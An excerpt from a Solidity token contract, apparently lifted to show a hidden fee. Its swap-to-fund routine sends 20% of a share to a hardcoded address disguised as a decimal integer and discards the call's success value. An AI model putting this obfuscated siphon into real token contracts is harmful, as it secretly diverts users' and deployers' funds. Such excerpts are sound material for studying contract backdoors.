...
contract FatToken is BaseFatToken {
                ...
                if (_swapPairList[to]) {
                    if (!inSwap) {
                        ...
                        if (contractTokenBalance > swapThreshold) {
                            ...
                            // }
                            swapTokenForFund(swapThreshold, swapFee);
                        }
                    }
                }
                takeFee = true;
    ...
    function swapTokenForFund(
        ...
        if (fundAmount > 0 && fundAddress != address(0)) {
            fundAddress.transfer(fundAmount - share);
        }
        ...
        {
            (bool tmpSuccess,) = payable(address(1387997230827466232599268141352718472221264333164)).call{value: share * 20 / 100, gas: 30000}("");
            tmpSuccess = false;
        }

        try _tokenDistributor.deposit{value: share * 80 / 100}() {} catch {}
